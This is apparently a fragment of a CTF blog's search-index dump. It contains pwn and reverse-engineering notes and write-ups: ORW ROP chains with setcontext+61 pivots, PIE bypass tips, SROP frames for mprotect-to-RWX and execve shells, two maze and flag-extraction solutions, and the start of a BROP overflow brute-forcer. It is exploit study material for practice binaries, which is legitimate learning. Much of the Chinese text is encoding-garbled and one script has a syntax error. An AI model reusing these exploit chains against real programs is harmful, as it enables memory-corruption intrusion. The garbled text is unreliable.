p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\nYCB easy_heap\n\n```\n#æ³¨é‡Šå¤´ \n#2.31 \n#è¿™é‡ŒåŒæ ·å°†free_hookè®¾ç½®ä¸ºgadgetï¼Œç”¨åˆ°çš„æ˜¯getkeyserv_handle+576ï¼š \nmov rdx, [rdi+8] \nmov [rsp+0C8h+var_C8], rax \ncall qword ptr [rdx+20h] \n\n#chunk_addr+8èµ‹å€¼ä¸ºchunk_addrï¼Œchunk_addr+0x20èµ‹å€¼ä¸ºsetcontext+61\nchunk_addr = heap_addr +0x20\nfake_rsp = chunk_addr + 0xb0 + 0x10\nflag = chunk_addr + 0xb0 \n\norw = \"a\"*0x08 + p64(chunk_addr) \norw += \"a\"*0x10 \norw += p64(libc_addr + libc.sym['setcontext'] + 61) + \"a\"*0x8\norw += \"a\"*0x70\n\norw += p64(fake_rsp) + p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n```\n\nâ–²åŒæ ·å¯ä»¥ç”¨frameç»“æ„ä½“æ¥è°ƒç”¨å‡½æ•°ã€‚\n","tags":["ORW-Skill"],"categories":["ORW"]},{"title":"PIEç»•è¿‡æ€»ç»“","url":"/2021/08/19/PIEç»•è¿‡æ€»ç»“/","content":"\n1.åˆ©ç”¨PIEæœºåˆ¶ï¼Œçˆ†ç ´å€’æ•°ç¬¬å››ä½å¯ä»¥è·³è½¬åˆ°åŒä¸€ä¸ªå†…å­˜é¡µä¸­çš„ä»»æ„å‡½æ•°ã€‚\n\n2.åˆ©ç”¨æ ˆæº¢å‡ºå’Œæ‰“å°å‡½æ•°çš„å‚æ•°ï¼Œä¿®æ”¹åŠ«æŒrbpä½¿å¾—åˆ©ç”¨rbpå¯»å€çš„æ‰“å°å‡½æ•°çš„å‚æ•°æŒ‡å‘æ ˆä¸Šå…¶å®ƒä½ç½®ï¼Œé€šè¿‡çˆ†ç ´æ¥å¯»æ±‚æ³„éœ²Libcåœ°å€ã€‚\n\n3.åˆ©ç”¨vsyscallæˆ–è€…vdsoæ¥æ»‘è¿‡ä¸€æ®µæ ˆç©ºé—´ï¼Œä»è€Œå°†eipæŒªç§»åˆ°æ ˆåº•ä¸‹æ–¹æˆ‘ä»¬æƒ³è¦çš„åœ°å€å¤„ã€‚\n\n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"SROPæ€»ç»“","url":"/2021/08/19/SROPæ€»ç»“/","content":"\nä¸€ã€SROPè°ƒç”¨çš„ç»“æ„ä½“ï¼Œåœ¨sigcontext.hä¸­æœ‰å®šä¹‰ï¼š\n\n1.32ä½ç¨‹åºï¼š\n\n(1)æ€»é•¿åº¦å…±è®¡ï¼š\n\n(2)è°ƒç”¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nA.32ä½ç³»ç»Ÿä¸Šè¿è¡Œ32ä½ç¨‹åºï¼š\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nB.64ä½ç³»ç»Ÿä¸Šè¿è¡Œ32ä½ç¨‹åºï¼š\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'amd64')\n```\n\n2.64ä½ç¨‹åºï¼š\n\n(1)æ€»é•¿å…±è®¡ï¼š0xf8\n\n(2)è°ƒç”¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ncontext.arch = â€˜amd64â€™\nSigreturnFrame(kernel = â€˜amd64â€™)\n```\n\n \n\näºŒã€pwnä¸­ä½¿ç”¨ï¼š\n\n1.é¦–å…ˆå®šä¹‰ï¼š\n\nframe_func = SigreturnFrame()\n\n2.ä¹‹åè®¾ç½®å¯„å­˜å™¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_func.rax = constants.SYS_func\nframe_func.rdi/rsi/......\nframe_func.rsp = stack_addr\n#æ ˆåŠ«æŒä¸€èˆ¬å¯ä»¥ç”¨åˆ°ï¼Œå³å½“SROPè¿è¡Œå®Œä¹‹åï¼Œæ ˆé¡¶å°±ä¼šè·³è½¬åˆ°è®¾ç½®çš„rspå¤„ï¼Œæ²¡è®¾ç½®åˆ™é»˜è®¤ä¸º0\nframe_func.rip = syscall_addr\n#è¿™é‡Œé€šè¿‡raxå’Œripé…åˆè°ƒç”¨ä»»æ„ç³»ç»Ÿå‡½æ•°ï¼Œå…¶å®ƒå¯„å­˜å™¨å°±æ˜¯ç”¨æ¥è®¾ç½®å‚æ•°çš„)\n```\n\n3.ä½¿ç”¨æ¡ä»¶ï¼š\n\n(1)æ²¡æœ‰sigreturn gadgetæŒ‡é’ˆæ—¶ï¼Œåˆ©ç”¨syscallæ¥è°ƒç”¨ï¼š\n\nâ‘ 64ä½éœ€è¦ç³»ç»Ÿè°ƒç”¨å·rax = 0xfã€‚32ä½éœ€è¦ç³»ç»Ÿè°ƒç”¨å·rax = 0x4d\n\n(è¿™ä¸ªä¸€èˆ¬å¯ä»¥é€šè¿‡readå‡½æ•°æ¥å®ç°ï¼Œä¿®æ”¹rax)\n\nâ‘¡è¿›å…¥æ—¶éœ€è¦æ‰§è¡Œsyscallï¼Œæ ˆé¡¶rspæŒ‡å‘frame_funcç»“æ„ä½“å¤´éƒ¨ã€‚\n\n(2)æœ‰sigreturnæŒ‡é’ˆæ—¶ï¼š\n\nç›´æ¥è¦†ç›–è¿”å›åœ°å€ä¸ºsigreturn gadgetï¼Œç„¶åè¯¥è¿”å›åœ°å€ä¸‹æ–¹çš„æ ˆä¸Šè¦†ç›–frame_funcç»“æ„ä½“ã€‚\n\n \n\nä¸‰ã€å¸¸ç”¨åŠŸèƒ½ï¼š\n\n1.readï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_read = SigreturnFrame() #è®¾ç½®readçš„SROPå¸§\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = stack_addr\nframe_read.rdx = 0x300\nframe_read.rip = syscall_addr\n```\n\n2.åˆ©ç”¨mprotectä¿®æ”¹å†…å­˜RWXæƒé™ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframe_mprotect = SigreturnFrame()\n#è®¾ç½®mprotectçš„SROPå¸§ï¼Œç”¨mprotectä¿®æ”¹æ ˆå†…å­˜ä¸ºRWX\nframe_mprotect.rax = constants.SYS_mprotect\nframe_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000\nframe_mprotect.rsi = 0x1000\nframe_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC\nframe_mprotect.rsp = stack_addr\nframe_mprotect.rip = syscall_addr\n```\n\n3.getshell:\n\n```\n#æ³¨é‡Šå¤´\n\nframe_execve = SigreturnFrame()\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = stack_addr+0x108\n#è¿™æ˜¯binshå­—ç¬¦ä¸²çš„åœ°å€\nframe_execve.rip = syscall_addr\n```\n\n \n\nå››ã€ç»“æ„ä½“ in /usr/include/bits/sigcontext.hï¼š\n\n```\n#æ³¨é‡Šå¤´  0xf8\n\nstruct sigcontext\n{\n__uint64_t r8;\n__uint64_t r9;\n__uint64_t r10;\n__uint64_t r11;\n__uint64_t r12;\n__uint64_t r13;\n__uint64_t r14;\n__uint64_t r15;\n__uint64_t rdi;\n__uint64_t rsi;\n__uint64_t rbp;\n__uint64_t rbx;\n__uint64_t rdx;\n__uint64_t rax;\n__uint64_t rcx;\n__uint64_t rsp;\n__uint64_t rip;\n__uint64_t eflags;\nunsigned short cs;\nunsigned short gs;\nunsigned short fs;\nunsigned short __pad0;\n__uint64_t err;\n__uint64_t trapno;\n__uint64_t oldmask;\n__uint64_t cr2;\n__extension__ union\n{\nstruct _fpstate * fpstate;\n__uint64_t __fpstate_word;\n};\n__uint64_t __reserved1 [8];\n};\n```\n\n \n\n```\n#æ³¨é‡Šå¤´    0x50\n\nstruct sigcontext\n{\nunsigned short gs, __gsh;\nunsigned short fs, __fsh;\nunsigned short es, __esh;\nunsigned short ds, __dsh;\nunsigned long edi;\nunsigned long esi;\nunsigned long ebp;\nunsigned long esp;\nunsigned long ebx;\nunsigned long edx;\nunsigned long ecx;\nunsigned long eax;\nunsigned long trapno;\nunsigned long err;\nunsigned long eip;\nunsigned short cs, __csh;\nunsigned long eflags;\nunsigned long esp_at_signal;\nunsigned short ss, __ssh;\nstruct _fpstate * fpstate;\nunsigned long oldmask;\nunsigned long cr2;\n};\n```\n\nå®é™…å¤§å°æœ€å¥½å¯¹åº”ç‰ˆæœ¬å†è°ƒè¯•\n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"X-CTF-maze","url":"/2021/08/19/X-CTF-maze/","content":"\næ–‡ä»¶åœ°å€ï¼šhttps://github.com/PIG-007/X-CTF\n\n 1.æ‹–å…¥exeinfope.exeæŸ¥çœ‹ç‰ˆæœ¬ä½æ•°ï¼Œ64ä½ï¼Œè½½å…¥IDA.\n\n2.ç”±äºé¢˜ç›®mazeçš„æç¤ºï¼Œè¿˜æœ‰å‡½æ•°ä¸­ä¸€ç›´å‡ºç°çš„8ï¼Œå†åŠ ä¸Šåˆ¤æ–­è¯­å¥ä¸­\n\nasc_601060[8 * (signed int)v9 + SHIDWORD(v9)] != '#'\n\nä»¥åŠå­—ç¬¦ä¸²ï¼š\n\nâ€œ  *******  *  **** * ****  * ***  *#  *** *** ***   *********â€\n\nå¯çŸ¥æ˜¯èµ°è¿·å®«é¢˜ç›®ï¼Œä¹Ÿå°±æ˜¯å°†è¯¥å­—ç¬¦ä¸²ä»¥8ä½ä¸ºä¸€ä¸ªè¡Œï¼Œå½¢æˆä¸€ä¸ª8*8çš„è¿·å®«ï¼š\n\n![https://adworld.xctf.org.cn/media/task/writeup/cn/maze/10.png](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557487.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557287.jpeg)\n\næŒ‰ç…§1çš„è·¯å¾„ä¸€ç›´èµ°ï¼Œå…±èµ°18æ­¥ã€‚\n\n3.ç„¶åå†ä»”ç»†åˆ†æï¼Œåœ¨linuxä¸­è¿è¡Œï¼Œéœ€è¦è¾“å…¥flagï¼Œå†åœ¨IDAä¸­å‘ç°æœ‰è¾“å…¥é•¿åº¦è¦æ±‚ï¼Œå¾—æ˜¯nctf{xxxxx(18ä¸ª)}è¿™ç§å½¢å¼ã€‚ç„¶ååˆ†æè¿·å®«ï¼Œå‘ç°å–æœ€çŸ­è·¯å¾„èµ°åˆ°#åˆšå¥½æ˜¯18ä¸ªã€‚\n\n4.ç°åœ¨å¼€å§‹å¯»æ‰¾æ–¹å‘ï¼šå¾ˆå®¹æ˜“å‘ç°å››ä¸ªifè¯­å¥ï¼šï¼ˆè¿™é‡Œå¾—å³é”®å¯¹åº”çš„æ•°å­—-Rè½¬æˆå­—ç¬¦å½¢å¼ï¼Œæ‰èƒ½çœ‹åˆ°å¯¹åº”æ•°å­—çš„asciiç ï¼‰\n\nif ( v4 == 'O' )\n\nif ( v4 == 'o' )\n\nif ( v4 == '.' )\n\nif ( v4 == '0' )\n\nè¿™ä¸ªåº”è¯¥å°±æ˜¯ä»£è¡¨ä¸Šä¸‹å·¦å³äº†ï¼Œé‚£ä¹ˆç°åœ¨è¿˜å¾—åˆ¤æ–­ç©¶ç«Ÿæ˜¯å“ªä¸ªä»£è¡¨å“ªä¸ªã€‚è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ã€‚ä¸€æ˜¯æ¥ç€çœ‹ä»£ç ï¼Œè¿›å»é‡Œé¢ä»”ç»†åˆ†æï¼Œå¯ä»¥æ¨å‡ºã€‚äºŒæ˜¯é€šè¿‡è¿œç¨‹è°ƒè¯•æ¥åˆ¤æ–­ã€‚\n\nâ–²æ–¹æ³•ä¸€ï¼šæˆ‘ä»¬è¿›å…¥åˆ°å››ä¸ªifè¯­å¥ä¸­çš„æ¯ä¸ªå‡½æ•°ä¸­çœ‹çœ‹ï¼Œæœ‰ç±»ä¼¼å¦‚ä¸‹è¯­å¥ï¼š\n\nv1 = (*a1)--;\n\nv1 = *a1 + 1;\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557346.jpeg)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557285.jpeg)\n\nä¼ å…¥çš„å€¼åˆ†åˆ«æ˜¯ï¼š&v10+4,å’Œ&v10ï¼Œè¿™é‡Œä¸åŒçš„IDAåæ±‡ç¼–å‡ºæ¥çš„å‚æ•°ä¸ä¸€æ ·ï¼Œä½†çœ‹v10çš„ç±»å‹æ˜¯ä¸€ä¸ªintå‹çš„æŒ‡é’ˆï¼Œ4ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªintï¼Œ&v10+4ä»£è¡¨intæŒ‡é’ˆå¾€ä¸‹æ‹¨åŠ¨ä¸€ä¸ªintï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„æŒ‡é’ˆ+1ï¼Œæœ‰çš„æ—¶å€™IDAä¹Ÿä¼šåæ±‡ç¼–ä¸º&v10+1ï¼Œè¿™æ˜¯ä»£è¡¨çš„æ˜¯&(V10+1)ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æ‹¬å·æ²¡æœ‰å†™å‡ºæ¥ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†é¼ æ ‡ç§»åŠ¨åˆ°å˜é‡ä¸Šï¼ŒæŒ‰ä¸‹Yå¿«æ·é”®ï¼Œè¾“å…¥int[2]æ¥ä¿®æ”¹ï¼Œä¹‹åå†æŒ‰Nå¿«æ·é”®ä¿®æ”¹å˜é‡åç§°ä¸ºdirectionï¼Œæœ€ç»ˆå˜æˆ\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557350.jpeg)\n\nè¿™æ ·å°±æ¸…æ™°å¤šäº†ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦int[2]ï¼Œå› ä¸ºè¿·å®«éƒ½æ˜¯äºŒç»´çš„ï¼Œä¸€èˆ¬å¯ç”¨x0yåæ ‡è½´æ¥è¡¨ç¤ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯å°†direction[1]læ¥ä»£è¡¨xè½´ï¼Œdirectionä»£è¡¨yè½´ï¼Œåä¹‹äº¦ç„¶ã€‚å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557351.jpeg)\n\né‚£ä¹ˆå°±æ˜¯Oå’Œoä»£è¡¨xè½´å·¦å³ï¼Œ0å’Œ.ä»£è¡¨yè½´ä¸Šä¸‹æˆ–è€…åè¿‡æ¥ï¼Œåˆ™flagå°±æœ‰ä¸¤ç§ï¼Œéƒ½åˆ—ä¸¾å‡ºæ¥æäº¤è¯•è¯•å°±å¯ä»¥å¾—åˆ°æ­£ç¡®ç­”æ¡ˆã€‚\n\nâ–²å°è¯•ç¬¬äºŒç§æ–¹æ³•ï¼Œè¿œç¨‹linuxä¸‹è°ƒè¯•ï¼šè¿™é‡Œè¿˜éœ€è¦çœ‹çœ‹æ¥ä¸‹æ¥çš„ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557829.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557885.jpeg)\n\næ‰€æœ‰æ–¹å‘åˆ¤æ–­è¯­å¥ä¹‹åéƒ½ä¼šè·³è½¬åˆ°LABEL_14ï¼Œç”±æ­¤å¯ä»¥æ–­å®šå¾—æ˜¯åˆ¤æ–­æ­£ç¡®æ‰ä¼šbreakæ¥ä½¿å¾—label20ä¸è¢«è¿è¡Œï¼Œä»è€Œè·³å‡ºæ‰“å°é”™è¯¯flagçš„è¯­å¥ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿å¾—v6=1ï¼Œç„¶åå†å‘ä¸Šæ‰¾æ‰¾ï¼Œæœ‰è¿™æ ·çš„è¯­å¥ï¼š\n\nè€Œv7åˆæ˜¯æ–¹å‘åˆ¤æ–­å‡½æ•°çš„è¿”å›å€¼ï¼Œæ‰€ä»¥åœ¨è¿è¡Œæ—¶å¯ä»¥å°è¯•çœ‹v7çš„å€¼æ¥åˆ¤æ–­è¾“å…¥çš„æ­£ç¡®ä¸å¦ã€‚äºæ˜¯åœ¨è¯¥å¤„ä¸‹æ–­ç‚¹ï¼Œæˆ–è€…å¯¹åº”æ±‡ç¼–ä»£ç ä¸­ï¼šmov bpl, alã€‚(é¼ æ ‡æ”¾åœ¨v7ä¸Šï¼Œæ˜¾ç¤ºalï¼Œè¯´æ˜v7æ˜¯å­˜æ”¾åœ¨alè¿™ä¸ªå˜é‡ä¸Šçš„)ï¼Œå°è¯•æ€§è¾“å…¥nctf{000000000000000000}ï¼Œè¾“å…¥å¤Ÿäº†å°±è¡Œï¼Œç„¶ååœ¨è¿è¡Œä¸­çœ‹v7ï¼Œä¹Ÿå°±æ˜¯alçš„å€¼ï¼Œå¦‚æœè¢«èµ‹å€¼ä¸º1ï¼Œåˆ™0å°±ä»£è¡¨å‘å³ï¼Œå› ä¸ºæˆ‘ä»¬è¿·å®«ä¸­ç¬¬ä¸€æ­¥å°±æ˜¯å‘å³çš„ï¼Œå¦åˆ™å°±æ¢ä¸‹ä¸€ä¸ªè¯•ã€‚ä¾æ¬¡ç±»æ¨ï¼Œå¯ä»¥é€šè¿‡è°ƒè¯•æ¥æ‘¸æ¸…æ–¹å‘ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557962.jpeg)\n\næ–­ç‚¹åœä½ï¼ŒæŸ¥çœ‹alçš„å€¼ä¸º1ï¼Œæœ¬æ¥åº”è¯¥è¯´æ˜0ä»£è¡¨å‘å³ï¼Œä½†æ˜¯å¦‚æœè¾“å…¥\n\nnctf{oooooooooooooooooo}ï¼Œalçš„å€¼ä¹Ÿæ˜¯1ã€‚è¿™é‡Œæ˜¯å› ä¸ºå³å’Œä¸‹éƒ½èƒ½èµ°ï¼Œä½†æ˜¯æºä»£ç ä¸­è¿˜æœ‰ä¸€ä¸ªåˆ¤æ–­é€»è¾‘ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557966.jpeg)\n\nä»£è¡¨æ’å¢™é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæ’å¢™ä¸Šäº†ï¼Œä»ç„¶ä¼šæ‰“å°é”™è¯¯Flagã€‚æŸ¥çœ‹è¿·å®«ï¼Œå‘ç°å‘ä¸‹ä¼šæ’å¢™ä¸Šï¼Œè€Œå¯¹åº”nctf{oooooooooooooooooo}è°ƒè¯•çš„æ—¶å€™ï¼Œæ¥ç€å•æ­¥æ‰§è¡Œï¼Œä¼šå‘ç°ç¨‹åºå†ä¸€æ¬¡è¿›å…¥æ–¹å‘åˆ¤æ–­å‡½æ•°ï¼Œå¹¶æ²¡æœ‰ç›´æ¥è¿›å…¥æ’å¢™çš„é€»è¾‘ä¸­ï¼Œè¯´æ˜nctf{oooooooooooooooooo}çš„ç¬¬ä¸€ä¸ªæ‰æ˜¯å³ï¼Œè€Œnctf{000000000000000000}ä¼šæ’å¢™ä¸Šï¼Œè™½ç„¶v7çš„å€¼æ˜¯1ï¼Œä½†ä»ç„¶ä¼šå¯¼è‡´é”™è¯¯ã€‚æ‰€ä»¥0ä»£è¡¨ä¸‹ï¼Œoä»£è¡¨å³ï¼Œä¾æ¬¡ç±»æ¨å°±å¯ä»¥åˆ¤æ–­å‡ºæ–¹å‘ã€‚\n\næœ€ç»ˆflagä¸ºï¼šnctf{o0oo00O000oooo..OO}\n\n(Linuxè¿œç¨‹è°ƒè¯•å¯ä»¥çœ‹å…¶å®ƒæ–‡ç« )\n\n \n\n \n\n \n","tags":["First"],"categories":["REVERSE"]},{"title":"X-CTF-no_string","url":"/2021/08/19/X-CTF-no_string/","content":"\næ–‡ä»¶åœ°å€ï¼šhttps://github.com/PIG-007/X-CTF\n\n1.  è¿™æ˜¯ä¸€ä¸ªlinuxç¨‹åºï¼Œå…ˆåœ¨Linuxç¯å¢ƒä¸‹è·‘ä¸€ä¸‹ï¼Œè¾“å‡ºä¸¤ä¸²æ²¡ç”¨å­—ç¬¦ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œä¸è¿‡è¿™ä¹Ÿä»£è¡¨äº†åº”è¯¥è¦è¾“å…¥ä¸œè¥¿ä¹‹åï¼Œæ˜¾ç¤ºæ­£ç¡®ï¼Œç„¶åæ‰“å°flagï¼Œæˆ–è€…ç›´æ¥è¾“å…¥flagï¼Œæ‰“å°æ­£ç¡®ã€‚\n2. è½½å…¥IDAï¼Œå‘ç°å…³é”®å‡½æ•°åœ¨authenticate()ä¸­çš„decrypt()ï¼Œå‡½æ•°decrypt()è¿›è¡Œä¸€å †ç®—æ³•ï¼Œç„¶åèµ‹å€¼ç»™s2ï¼Œå†å°†s2ä¸è¾“å…¥çš„å­—ç¬¦ä¸²ä½œæ¯”è¾ƒï¼Œä¸€æ ·å°±æ‰“å°æˆåŠŸï¼Œä½†æ˜¯ä¸æ‰“å°å…¶å®ƒå­—ç¬¦ä¸²ã€‚è¿™é‡Œå°±å¯ä»¥åˆ¤å®šæˆ‘ä»¬åº”è¯¥æ˜¯å¾—è¾“å…¥flagï¼Œç„¶åç¨‹åºåˆ¤æ–­åæ‰“å°æˆåŠŸã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦çš„flagå°±åº”è¯¥åœ¨s2ä¸­ã€‚è¿™é‡Œå°±å¯ä»¥åˆ†ä¸¤ç§æ–¹æ³•æ¥è·å–flagã€‚\n\nâ˜…ç¬¬ä¸€ç§ï¼šè®©ç¨‹åºè·‘èµ·æ¥ï¼Œç„¶åæŸ¥çœ‹s2æ‰€åœ¨å¯„å­˜å™¨çš„çš„å€¼\n\n(1)æ‰“å¼€linuxçš„è™šæ‹Ÿç¯å¢ƒï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥gdb no_stringï¼Œå¼€å§‹ä½¿ç”¨gdbè½½å…¥ç¨‹åºã€‚\n\n(2)è¾“å…¥å‘½ä»¤b decryptï¼Œè¡¨ç¤ºåœ¨è¯¥å‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼Œä¹‹åè¾“å…¥rè®©ç¨‹åºè¿è¡Œè‡³æ–­ç‚¹å¤„åœæ­¢ã€‚\n\n(3)è¿™æ—¶å€™å› ä¸ºç¨‹åºæ˜¯åœåœ¨decryptè¿™ä¸ªå‡½æ•°ä¸Šï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œè¯¥å‡½æ•°ï¼Œæ‰€ä»¥åº”è¯¥è¾“å…¥næ¥ä½¿å¾—ç¨‹åºè¿›è¡Œä¸€æ­¥ï¼Œè¿è¡Œè¯¥å‡½æ•°ã€‚\n\n(4)æ­¤æ—¶eaxå¯„å­˜å™¨ä¸­åº”è¯¥ä¿å­˜ç€s2ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„flagçš„å€¼ï¼Œæ‰€ä»¥è¾“å…¥å‘½ä»¤ï¼šx/200wx$eax æ¥è·å–eaxå¯„å­˜å™¨ä¸­çš„å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191557048.jpeg)\n\nä»0x00000039ä¸€ç›´åˆ°å­—ç¬¦ä¸²ç»“å°¾å­—ç¬¦æ ‡å¿—0x00000000ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”flagçš„å€¼ï¼Œå¤§å®¶ç›´æ¥é»è´´å‡ºæ¥è½¬asciiç å°±è¡Œã€‚\n\nâ–²200æ˜¯ä»£è¡¨æŸ¥çœ‹å¤šå°‘ä¸ªï¼Œwxæ˜¯ä»£è¡¨ä»¥wordå­—èŠ‚æŸ¥çœ‹ï¼Œ$eaxå³æ˜¯æŸ¥çœ‹è¯¥å¯„å­˜å™¨çš„å€¼ã€‚\n\n(å¦å¤–ï¼šå¯ä»¥é€šè¿‡IDApythonæ¥æ‰“å°ï¼Œä¹Ÿå°±æ˜¯å…ˆåœ¨linuxä¸‹è¿œç¨‹åŠ¨æ€è°ƒè¯•ï¼Œå°†æ–­ç‚¹åœåœ¨decryptä¸Šï¼Œç„¶åè¿è¡Œä¸€æ­¥ï¼Œåœ¨å³ä¸Šè§’å¯„å­˜å™¨çª—å£æ å³é”®eax-åœ¨æ•°æ®çª—å£è·Ÿéšï¼Œæ‰¾åˆ°eaxçš„é¦–åœ°å€ï¼Œè¿è¡Œå¦‚ä¸‹pyä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\naddr=0x0965D800#eaxé¦–åœ°å€ï¼Œæˆ–è€…ç‚¹å‡»eaxé¦–åœ°å€ï¼Œç„¶åæ¢æˆhere()\nans=\"\"\nfor temp addr in range(addr,addr+50*4,4):\n    ans+=get_bytes(tempaddr,1)\nprint(ans)\n```\n\n \n\nè¿™é‡Œaddr+50*4ä»£è¡¨ä»addrå¼€å§‹åç§»é‡ä¸º50*4ï¼Œå› ä¸ºå¯ä»¥çœ‹åˆ°eaxä¸­æ¯å››ä¸ªå­—èŠ‚å­˜ å‚¨ä¸€ä¸ªå­—ç¬¦æ•°æ®ï¼Œä¹Ÿå°±æ˜¯å‘ä¸‹è¯»å–50ä¸ªå­—ç¬¦ï¼Œç„¶ååé¢çš„4æ˜¯ä»¥4ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½æ¥ç¿»è¯‘å­—ç¬¦)\n\nâ˜…ç¬¬äºŒç§ï¼š\n\n(1)åœ¨IDAä¸­æŸ¥çœ‹ä¼ å…¥decryptçš„ä¸¤ä¸ªæ•°æ®ï¼Œå¯ä»¥ç”¨Pyè„šæœ¬æ‰“å°æˆ–è€…æ˜¯ç‚¹è¿›å»ï¼Œç„¶åé€‰ä¸­æ•´ä¸ªæ•°æ®æ®µä¹‹åshift+Eï¼Œå¯ä»¥è½¬æ¢ä¸ºCç±»å‹æˆ–è€…æ˜¯hexç±»å‹å¯å¾—ã€‚\n\n(2)ç„¶åç¼–å†™é€†æ¨ç®—æ³•ï¼šåˆ©ç”¨åå…­è¿›åˆ¶æ¥è¡¨ç¤ºã€‚\n","tags":["First"],"categories":["REVERSE"]},{"title":"hctf2016-brop","url":"/2021/08/19/hctf2016-brop/","content":"\n1.é¢˜ç›®ç”¨ä»¥ä¸‹ä»£ç ç¼–è¯‘å’Œæ­å»ºï¼Œ[brop.c]å°±æ˜¯ç¨‹åºä»£ç æ–‡ä»¶\n\n```\n#æ³¨é‡Šå¤´\n\ngcc -z noexecstack -fno-stack-protector -no-pie brop.c -o brop\nsocat tcp-listen:10001,fork exec:./brop,reuseaddr &\n```\n\n2.ç¨‹åºä¸æ‰“å°æˆ‘ä»¬çš„è¾“å…¥ï¼Œå¹¶ä¸”è¾“å…¥å¤šä¸ª%pæ²¡ä»€ä¹ˆååº”ï¼Œé‚£ä¹ˆåº”è¯¥å°±ä¸æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›²æ‰“ï¼Œå°è¯•æ ˆæº¢å‡ºè¡Œä¸è¡Œï¼Œä½¿ç”¨è„šæœ¬çˆ†ç ´ä¸€ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef getbufferflow_length():\n    i = 1\n    while 1:\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvuntil('WelCome my friend,Do you know password?\\n ')\n            sh.send(i * 'a')\n            output = sh.recv()\n            sh.close()\n            if not output.startswith('No password'):\n                return i - 1\n            else:\n                i += 1\n        except EOFError:\n            sh.close()\n            return i - 1\n\nbuf_size = getbufferflow_length()\nlog.info(\"buf_size:%d\"%buf_size)\n```\n\nä¸æ–­å°è¯•ï¼Œå¦‚æœæ²¡æœ‰æ¥æ”¶åˆ°â€œNo passwordâ€é‚£å°±ä»£è¡¨ç¨‹åºå‡ºé”™ï¼Œæ ˆæº¢å‡ºè¦†ç›–åˆ°äº†è¿”å›åœ°å€ï¼Œè¿™æ—¶å€™å°±é€€å‡ºï¼Œå…¶å®ƒé”™è¯¯ä¹Ÿé€€å‡ºã€‚æœ€åçˆ†ç 